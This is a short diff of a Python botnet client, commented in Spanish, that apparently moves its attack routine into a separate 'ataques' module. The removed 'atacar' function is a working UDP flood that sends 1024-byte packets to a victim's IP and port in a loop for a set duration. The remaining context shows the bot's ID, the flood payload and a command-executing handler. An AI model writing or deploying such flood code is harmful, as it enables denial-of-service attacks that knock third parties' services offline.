@@ -14,22 +14,6 @@ BOT_ID = "bot1"
 # Tamano del paquete que mandamos a la victima
 PAYLOAD = b"X" * 1024
 
-
-def atacar(ip_victima, puerto_victima, duracion):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    fin = time.time() + duracion
-    enviados = 0
-    print(f"[BOT] Atacando {ip_victima}:{puerto_victima} durante {duracion}s...")
-    while time.time() < fin:
-        try:
-            s.sendto(PAYLOAD, (ip_victima, puerto_victima))
-            enviados += 1
-        except OSError:
-            pass
-    s.close()
-    print(f"[BOT] Ataque terminado. Paquetes enviados: {enviados}")
-
-
 from ataques import lanzar_ataque
 
 def ejecutar(orden):
